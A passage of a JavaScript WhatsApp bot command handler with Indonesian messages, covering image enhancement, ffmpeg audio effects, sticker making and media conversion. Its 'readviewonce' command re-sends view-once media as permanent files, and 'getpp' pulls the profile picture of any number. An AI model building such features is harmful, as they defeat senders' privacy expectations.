						caption: `🌟 *Effect*: ${command.toUpperCase()}\n📩 *Request by*: ${tag}\n${versionInfo}\n📏 *Skala available*: ${availableScales.toString()}`,
						mentions: [m.sender]
					}, {
						quoted: m
					});
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'upscale': {
				const availableScales = [2, 4, 6];
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!quoted) return m.warning(`Fotonya Mana?`)
				if (!/image/.test(mime)) return m.warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let media = await quoted.download()
					let scale = availableScales.includes(parseInt(text)) ? parseInt(text) : 2;
					let tag = `@${m.sender.split("@")[0]}`;
					let result = await upscale(media, scale);
					let versionInfo = `✨ *Source*: imageupscaler.com\n🔍 *Skala*: ${scale}`;
					await vreden.sendMessage(m.chat, {
						image: {
							url: result
						},
						caption: `🌟 *Effect*: ${command.toUpperCase()}\n📩 *Request by*: ${tag}\n${versionInfo}\n📏 *Skala available*: ${availableScales.toString()}`,
						mentions: [m.sender]
					}, {
						quoted: m
					});
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'wink': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!quoted) return m.warning(`Fotonya Mana?`)
				if (!/image/.test(mime)) return m.warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let tag = `@${m.sender.split("@")[0]}`
					let versionInfo = `✨ *Source*: vyro.ai`;
					let media = await quoted.download()
					let prosess = await remini(media, "enhance");
					let proses = await remini(prosess, "enhance");
					await vreden.sendMessage(m.chat, {
						image: proses,
						caption: `🌟 *Effect*: ${command.toUpperCase()}\n📩 *Request by*: ${tag}\n${versionInfo}\n📏 *Enhance Persent*: 400%`,
						mentions: [m.sender]
					}, {
						quoted: m
					});
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'dehaze':
			case 'recolor': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!quoted) return m.warning(`Fotonya Mana?`)
				if (!/image/.test(mime)) return m.warning(`Send/Reply Foto Dengan Caption ${prefix + command}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let tag = `@${m.sender.split("@")[0]}`
					let versionInfo = `✨ *Source*: vyro.ai`;
					let media = await quoted.download()
					let proses = await processing(media, command);
					await vreden.sendMessage(m.chat, {
						image: proses,
						caption: `🌟 *Effect*: ${command.toUpperCase()}\n📩 *Request by*: ${tag}\n${versionInfo}\n📏 *${capitalizeWords(command)} Persent*: 150%`,
						mentions: [m.sender]
					}, {
						quoted: m
					});
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'hdvid': {
				if (!isCreator && !isPremium) return m.tolak('Fitur khusus user premium!')
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!/video/.test(mime)) return m.warning(`Reply Video Yang Ingin Dijadikan HD Dengan Caption ${prefix + command}`)
				if (!quoted) return m.warning(`Reply Video Yang Ingin Dijadikan HD Dengan Caption ${prefix + command}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let output = getRandom('.mp4')
					const media = await vreden.downloadAndSaveMediaMessage(quoted)
					ffmpeg(media)
						.outputOptions('-s', '1280x720') // Ganti resolusi sesuai kebutuhan, contoh disini menggunakan 1280x720
						.save(output)
						.on('end', () => {
							// Mengirim video yang telah ditingkatkan resolusinya
							vreden.sendMessage(m.chat, {
								video: fs.readFileSync(output),
								caption: "Nih!",
								gifPlayback: false
							}, {
								quoted: m
							})
						})
						.on('error', (err) => {
							console.error(err)
							m.reply('Terjadi kesalahan saat meningkatkan resolusi video. ' + err)
						})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'kompres': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!/video/.test(mime)) return m.warning(`Reply Video Yang Ingin Diperkecil Dengan Caption ${prefix + command}`)
				if (!quoted) return m.warning(`Reply Video Yang Ingin Diperkecil Dengan Caption ${prefix + command}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let output = getRandom('.mp4')
					const media = await vreden.downloadAndSaveMediaMessage(quoted)
					ffmpeg(media)
						.outputOptions('-s', '640x360') // Ganti resolusi sesuai kebutuhan, contoh disini menggunakan 1280x720
						.save(output)
						.on('end', () => {
							// Mengirim video yang telah ditingkatkan resolusinya
							vreden.sendMessage(m.chat, {
								video: fs.readFileSync(output),
								caption: "Nih!",
								gifPlayback: false
							}, {
								quoted: m
							})
						})
						.on('error', (err) => {
							console.error(err)
							m.reply('Terjadi kesalahan saat menurunkan resolusi video. ' + err)
						})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break

			//━━━━━━━━━━━━━━━[ CONVERT ]━━━━━━━━━━━━━━━━━//
			case 'bass':
			case 'blown':
			case 'deep':
			case 'earrape':
			case 'fast':
			case 'fat':
			case 'nightcore':
			case 'reverse':
			case 'robot':
			case 'slow':
			case 'smooth':
			case 'tupai': {
				try {
					let set
					if(/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
					if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
					if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
					if (/earrape/.test(command)) set = '-af volume=12'
					if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
					if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
					if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
					if (/reverse/.test(command)) set = '-filter_complex "areverse"'
					if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
					if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
					if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
					if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
					if (/audio/.test(mime)) {
						await vreden.sendMessage(m.chat, {
							react: {
								text: "⏱️",
								key: m.key,
							}
						})
						let media = await vreden.downloadAndSaveMediaMessage(quoted)
						let ran = getRandom('.mp3')
						exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
							fs.unlinkSync(media)
							if (err) return m.reply(err)
							let buff = fs.readFileSync(ran)
							vreden.sendMessage(m.chat, {
								audio: buff,
								mimetype: 'audio/mpeg'
							}, {
								quoted: m
							})
							fs.unlinkSync(ran)
						})
					} else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break

			//━━━━━━━━━━━━━━━[ STICKER ]━━━━━━━━━━━━━━━━━//
			case 'patrick':
			case 'doge':
			case 'popoci':
			case 'sponsbob':
			case 'awoawo':
			case 'dino-kuning':
			case 'kucing':
			case 'meow':
			case 'manusia-lidi': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					let rdmstik = await fetchJson(`https://www.vreden.my.id/cdn/sticker/${command}.json`)
					let result = await pickRandom(rdmstik)
					let dino = await getBuffer(result)
					vreden.imgToSticker(m.chat, dino, m, {
						packname: `Sticker Maker\nNomor Bot :`,
						author: `${botName}\n${ownnomor}`
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'kawan-sponsbob':
			case 'chat':
			case 'dbfly':
			case 'gojosatoru':
			case 'hope-boy':
			case 'jisoo':
			case 'kr-robot':
			case 'menjamet':
			case 'nicholas':
			case 'tyni': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					let dinoo = `https://api.zeeoneofc.my.id/api/telegram-sticker/${command}?apikey=${setting.BotKey}`
					let dino = await getBuffer(dinoo)
					vreden.imgToSticker(m.chat, dino, m, {
						packname: `Sticker Maker\nNomor Bot :`,
						author: `${botName}\n${ownnomor}`
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break // Fix Qioo
			case 'qckode':
			case 'qcwarna':
			case 'qccode': {
				m.warning(`Contoh: ${prefix}qc pink hallo\n\n*List Warna*\npink\nbiru\nmerah\nhijau\nkuning\nungu\nbirutua\nbirumuda\nabu\norange\nhitam\nputih\nteal\nmerahmuda\ncokelat\nsalmon\nmagenta\ntan\nwheat\ndeeppink\napi\nbirulangit\njingga\nbirulangitcerah\nhotpink\nbirumudalangit\nhijaulaut\nmerahtua\noranyemerah\ncyan\nungutua\nhijaulumut\nhijaugelap\nbirulaut\noranyetua\nungukehitaman\nfuchsia\nmagentagelap\nabu-abutua\npeachpuff\nhijautua\nmerahgelap\ngoldenrod\nabu-abutua\nungugelap\nemas\nperak`)
			}
			break
			case 'qc': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`);
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} pink hallo\n\nlist warna\npink\nbiru\nmerah\nhijau\nkuning\nungu\nbirutua\nbirumuda\nabu\norange\nhitam\nputih\nteal\nmerahmuda\ncokelat\nsalmon\nmagenta\ntan\nwheat\ndeeppink\napi\nbirulangit\njingga\nbirulangitcerah\nhotpink\nbirumudalangit\nhijaulaut\nmerahtua\noranyemerah\ncyan\nungutua\nhijaulumut\nhijaugelap\nbirulaut\noranyetua\nungukehitaman\nfuchsia\nmagentagelap\nabu-abutua\npeachpuff\nhijautua\nmerahgelap\ngoldenrod\nabu-abutua\nungugelap\nemas\nperak`)
				let [color, ...message] = text.split(' ');
				message = message.join(' ');
				let backgroundColor;

				switch (color) {
					case 'pink':
						backgroundColor = '#f68ac9';
						break;
					case 'biru':
						backgroundColor = '#6cace4';
						break;
					case 'merah':
						backgroundColor = '#f44336';
						break;
					case 'hijau':
						backgroundColor = '#4caf50';
						break;
					case 'kuning':
						backgroundColor = '#ffeb3b';
						break;
					case 'ungu':
						backgroundColor = '#9c27b0';
						break;
					case 'birutua':
						backgroundColor = '#0d47a1';
						break;
					case 'birumuda':
						backgroundColor = '#03a9f4';
						break;
					case 'abu':
						backgroundColor = '#9e9e9e';
						break;
					case 'orange':
						backgroundColor = '#ff9800';
						break;
					case 'hitam':
						backgroundColor = '#000000';
						break;
					case 'putih':
						backgroundColor = '#ffffff';
						break;
					case 'teal':
						backgroundColor = '#008080';
						break;
					case 'merahmuda':
						backgroundColor = '#FFC0CB';
						break;
					case 'cokelat':
						backgroundColor = '#A52A2A';
						break; // Added break
					case 'salmon':
						backgroundColor = '#FFA07A';
						break;
					case 'magenta':
						backgroundColor = '#FF00FF';
						break;
					case 'tan':
						backgroundColor = '#D2B48C';
						break;
					case 'wheat':
						backgroundColor = '#F5DEB3';
						break;
					case 'deeppink':
						backgroundColor = '#FF1493';
						break;
					case 'api':
						backgroundColor = '#B22222';
						break;
					case 'birulangit':
						backgroundColor = '#00BFFF';
						break;
					case 'jingga':
						backgroundColor = '#FF7F50';
						break;
					case 'birulangitcerah':
						backgroundColor = '#1E90FF';
						break;
					case 'hotpink':
						backgroundColor = '#FF69B4';
						break;
					case 'birumudalangit':
						backgroundColor = '#87CEEB';
						break;
					case 'hijaulaut':
						backgroundColor = '#20B2AA';
						break;
					case 'merahtua':
						backgroundColor = '#8B0000';
						break;
					case 'oranyemerah':
						backgroundColor = '#FF4500';
						break;
					case 'cyan':
						backgroundColor = '#48D1CC';
						break;
					case 'ungutua':
						backgroundColor = '#BA55D3';
						break;
					case 'hijaulumut':
						backgroundColor = '#00FF7F';
						break;
					case 'hijaugelap':
						backgroundColor = '#008000';
						break;
					case 'birulaut':
						backgroundColor = '#191970';
						break;
					case 'oranyetua':
						backgroundColor = '#FF8C00';
						break;
					case 'ungukehitaman':
						backgroundColor = '#9400D3';
						break;
					case 'fuchsia':
						backgroundColor = '#FF00FF';
						break;
					case 'magentagelap':
						backgroundColor = '#8B008B';
						break;
					case 'abu-abutua':
						backgroundColor = '#696969';
						break;
					case 'peachpuff':
						backgroundColor = '#FFDAB9';
						break;
					case 'hijautua':
						backgroundColor = '#BDB76B';
						break;
					case 'merahgelap':
						backgroundColor = '#DC143C';
						break;
					case 'goldenrod':
						backgroundColor = '#DAA520';
						break;
					case 'emas':
						backgroundColor = '#FFD700';
						break;
					case 'perak':
						backgroundColor = '#C0C0C0';
						break;
					default:
						backgroundColor = '#ffffff'
						message = text
				}

				try {
					avatar = await vreden.profilePictureUrl(m.sender, "image");
				} catch {
					avatar = 'https://telegra.ph/file/c3f3d2c2548cbefef1604.jpg';
				}

				const json = {
					type: "quote",
					format: "png",
					backgroundColor,
					width: 700,
					height: 580,
					scale: 2,
					messages: [{
						entities: [],
						avatar: true,
						from: {
							id: 1,
							name: pushname,
							photo: {
								url: avatar
							}
						},
						text: message,
						"m.replyMessage": {}
					}],
				};

				try {
					const res = await axios.post("https://quotly.netorare.codes/generate", json, {
						headers: {
							"Content-Type": "application/json"
						},
					});
					const qc = Buffer.from(res.data.result.image, "base64");
					await vreden.imgToSticker(m.chat, qc, m, {
						packname: `Sticker Maker\nNomor Bot :`,
						author: `${botName}\n${ownnomor}`
					});
				} catch (error) {
					console.error("Error generating QC v1:", error);
					try {
						const data = await axios.post("https://bot.lyo.su/quote/generate", json, {
							headers: {
								"Content-Type": "application/json"
							},
						});
						const qc = Buffer.from(data.data.result.image, "base64");
						await vreden.imgToSticker(m.chat, qc, m, {
							packname: `Sticker Maker\nNomor Bot :`,
							author: `${botName}\n${ownnomor}`
						});
					} catch (error) {
						await m.errorReport(util.format(error), command)
					}
				}
			}
			break
			case 'lonte': {
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				try {
					let lontee = `https://api.zeeoneofc.my.id/api/telegram-sticker/${command}?apikey=${setting.BotKey}`
					var lonte = await getBuffer(lontee)
					vreden.imgToSticker(m.chat, lonte, m, {
						packname: `Sticker Maker\nNomor Bot :`,
						author: `${botName}\n${ownnomor}`
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break // Fix Qioo
			case 'stiker':
			case 'sticker':
			case 's':
			case 'stickergif':
			case 'sgif': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!quoted) return m.warning(`Balas Video/Image Dengan Caption ${prefix + command}`)
				try {
					if (quoted.isAnimated === true) {
						var media = await vreden.downloadAndSaveMediaMessage(quoted, new Date * 1)
						let anu = await pomfCDN(media);
						let webpToMp4 = await webp2mp4File(anu)
						let buffer = await getBuffer(webpToMp4)
						await vreden.vidToSticker(m.chat, buffer, m, {
							packname: `Sticker Maker\nNomor Bot :`,
							author: `${botName}\n${ownnomor}`
						})
						await fs.unlinkSync(media)
					} else if (/image/.test(mime)) {
						let media = await vreden.downloadAndSaveMediaMessage(quoted, +new Date * 1)
						await vreden.imgToSticker(m.chat, media, m, {
							packname: `Sticker Maker\nNomor Bot :`,
							author: `${botName}\n${ownnomor}`
						})
						await fs.unlinkSync(media)
					} else if (/video/.test(mime)) {
						if ((quoted.msg || quoted).seconds > 11) return m.warning('Maksimal 10 detik!')
						let media = await vreden.downloadAndSaveMediaMessage(quoted, +new Date * 1)
						await vreden.vidToSticker(m.chat, media, m, {
							packname: `Sticker Maker\nNomor Bot :`,
							author: `${botName}\n${ownnomor}`
						})
						await fs.unlinkSync(media)
					} else m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'stickerwm':
			case 'swm':
			case 'stickergifwm':
			case 'sgifwm':
			case 'wm': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!isPremium) return m.tolak(mess.OnlyPrem)
				if (!quoted) return m.warning(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
				if (!text) return m.warning(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
				let [t1, t2] = text.split`|`
				let teks1 = t1 ? t1 : ""
				let teks2 = t2 ? t2 : ""
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					if (m.quoted.isAnimated === true) {
						var media = await vreden.downloadAndSaveMediaMessage(quoted, new Date * 1)
						let anu = await pomfCDN(media);
						let webpToMp4 = await webp2mp4File(anu)
						let buffer = await getBuffer(webpToMp4)
						vreden.vidToSticker(m.chat, buffer, m, {
							packname: `${teks1}`,
							author: `${teks2}`
						})
					} else if (/image/.test(mime)) {
						let media = await quoted.download()
						vreden.imgToSticker(m.chat, media, m, {
							packname: `${teks1}`,
							author: `${teks2}`
						})
					} else if (/video/.test(mime)) {
						if ((quoted.msg || quoted).seconds > 11) return m.warning('Maksimal 10 detik!')
						let media = await quoted.download()
						vreden.vidToSticker(m.chat, media, m, {
							packname: `${teks1}`,
							author: `${teks2}`
						})
					} else {
						m.reply(`Balas Video/Image Dengan Caption ${prefix + command} teks1|teks2`)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'stikersearch':
			case 'stiksearch':
			case 'searchstik':
			case 'caristicker':
			case 'caristiker': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} text\n\nContoh : ${prefix+command} yaya`)
				try {
					let anu = await stickerSearch(text)
					for (let stik of anu.sticker) {
						var stk = await getBuffer(stik)
						await vreden.imgToSticker(m.chat, stk, m, {
							packname: `Sticker Maker\nNomor Bot :`,
							author: `${botName}\n${ownnomor}`
						})
						await sleep(3000)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'smeme':
			case 'stickmeme':
			case 'stikmeme':
			case 'stickermeme':
			case 'stikermeme': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				try {
					if (!/webp/.test(mime) && /image/.test(mime)) {
						await vreden.sendMessage(m.chat, {
							react: {
								text: "⏱️",
								key: m.key,
							}
						})
						atas = text.split('|')[0] ? text.split('|')[0] : '-'
						bawah = text.split('|')[1] ? text.split('|')[1] : '-'
						mee = await vreden.downloadAndSaveMediaMessage(quoted)
						mem = await pomfCDN(mee)
						let smemee = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
						var smeme = await getBuffer(smemee)
						await vreden.imgToSticker(m.chat, smeme, m, {
							packname: `Sticker Maker\nNomor Bot :`,
							author: `${botName}\n${ownnomor}`
						})
					} else {
						m.reply(`Kirim/reply image dengan caption ${prefix + command} text1|text2`)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'getpp': {
				if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				try {
					avatar = await vreden.profilePictureUrl(users, "image")
				} catch {
					avatar = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
				}
				try {
					vreden.sendMessage(m.chat, {
						image: {
							url: avatar
						},
						caption: `*Profile Photos 💫*\n`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'getppgc': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				try {
					avatar = await vreden.profilePictureUrl(m.chat, "image")
				} catch {
					avatar = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				try {
					vreden.sendMessage(m.chat, {
						image: {
							url: avatar
						},
						caption: `*Profile Photos Grup💫*\n`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'getname': {
				if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`Tag/Reply Target Yang Mau Di ${command}`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				try {
					let name = vreden.getName(users)
					m.sendForward(`${name}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'getnamegc':
			case 'getsubjekgc': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				try {
					m.sendForward(`${groupName}`)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'getdesk':
			case 'getdeskripsigc':
			case 'getdesc': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				try {
					let iya = `DESKRIPSI GRUB *${groupName}*\n\n${groupMetadata.desc}`
					m.sendForward(iya)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'cekid':
			case 'getid':
			case 'getidgrup':
			case 'getidgc':
			case 'cekidgc': {
				if (!m.isGroup) return m.warning(mess.OnlyGrup)
				try {
					let tod = `*GET ID GRUB*\n${groupMetadata.id}\n\n*GRUB NAME :* ${groupName}`
					m.sendForward(tod)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tourl': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!quoted) return m.warning('Reply Image')
				if (!mime) return m.reply(`Kirim Video/Image Dengan Caption ${prefix + command}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					if (/image|video|audio/.test(mime)) {
						let media = await vreden.downloadAndSaveMediaMessage(quoted);
						let anu = await pomfCDN(media);
						m.reply(`*Link* : ${anu}`);
						await fs.unlinkSync(media);
					} else if (!/image/.test(mime)) {
						let media = await vreden.downloadAndSaveMediaMessage(quoted, quoted.fileName, false);
						let anu = await pomfCDN(media);
						m.reply(`*Link* : ${anu}`);
						await fs.unlinkSync(media);
					} else {
						m.reply(`Jenis media tidak support`)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break;
			case 'tomp4':
			case 'tovid':
			case 'tovideo': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!quoted) return m.warning('Reply Stiker')
				if (!/webp/.test(mime)) return m.warning(`Balas sticker dengan caption *${prefix + command}*`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					var media = await vreden.downloadAndSaveMediaMessage(quoted, new Date * 1)
					let anu = await pomfCDN(media);
					let webpToMp4 = await webp2mp4File(anu)
					vreden.sendMessage(m.chat, {
						video: {
							url: webpToMp4
						},
						caption: `*🚀 Converted*: ${latensi.toFixed(4)}s`
					}, {
						quoted: fchannel
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break //Fix Qioo
			case 'toimage':
			case 'toimg': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!quoted) return m.warning('Reply Image')
				if (!/webp/.test(mime)) return m.warning(`Balas sticker dengan caption *${prefix + command}*`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let media = await vreden.downloadAndSaveMediaMessage(quoted)
					let ran = await getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) throw err
						let buffer = fs.readFileSync(ran)
						vreden.sendMessage(m.chat, {
							image: buffer,
							caption: `*🚀 Converted*: ${latensi.toFixed(4)}s`
						}, {
							quoted: m
						})
						fs.unlinkSync(ran)
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'readvo':
			case 'rvo':
			case 'readviewonce': {
				if (!m.quoted) return m.warning('Reply gambar/video yang ingin Anda lihat')
				if (m.quoted.mtype !== 'viewOnceMessageV2') return m.warning('Ini bukan pesan view-once.')
				try {
					let msg = m.quoted.message
					let type = Object.keys(msg)[0]
					let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
					let buffer = Buffer.from([])
					for await (const chunk of media) {
						buffer = Buffer.concat([buffer, chunk])
					}
					if (/video/.test(type)) {
						return vreden.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
					} else if (/image/.test(type)) {
						return vreden.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'toptv': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				const {
					toPTT
				} = require('./lib/converter')
				const {
					MessageType
				} = require('@whiskeysockets/baileys')
				let q = m.quoted ? m.quoted : m
				if (!/video|audio/.test(mime)) return m.warning(`Balas video atau voice note yang ingin diubah ke mp3 dengan caption *${prefix + command}*`)
				try {
					let media = await q.download()
					let dataVideo = {
						ptvMessage: m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage
					}
					vreden.relayMessage(m.chat, dataVideo, {})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tovn': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!/video/.test(mime) && !/audio/.test(mime)) return m.warning(`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
				if (!quoted) return m.warning(`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let media = await quoted.download()
					let {
						toAudio
					} = require('./lib/converter')
					let audio = await toAudio(media, 'mp4')
					vreden.sendMessage(m.chat, {
						audio,
						mimetype: 'audio/mpeg',
						ptt: true
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tinyurl': {
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *link*\n\nContoh : ${prefix+command} https://google.com`)
				if (!isUrl(text)) return m.warning(`Gunakan dengan cara ${prefix+command} *link*\n\nContoh : ${prefix+command} https://google.com`)
				try {
					let tiny = await axios.get(`https://tinyurl.com/api-create.php?url=${text}`)
					let data = tiny.data
					m.sendForward(data)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'toaudio':
			case 'tomp3': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!/video/.test(mime) && !/audio/.test(mime)) return m.warning(`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
				if (!quoted) return m.warning(`Reply Video/Vn Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let media = await quoted.download()
					let {
						toAudio
					} = require('./lib/converter')
					let audio = await toAudio(media, 'mp4')
					vreden.sendMessage(m.chat, {
						audio,
						mimetype: 'audio/mpeg'
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'ttp': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
				if (text.length > 20) return m.warning("Maksimal 20 karakter")
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const ttp = require('./lib/text2picture')
					let tpp = await ttp.ttp(text)
					var ttpp = await getBuffer(tpp[0].url)
					await vreden.imgToSticker(m.chat, ttpp, m, {
						packname: `Sticker Maker\nNomor Bot :`,
						author: `${botName}\n${ownnomor}`
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'attp': { //Fix Qioo
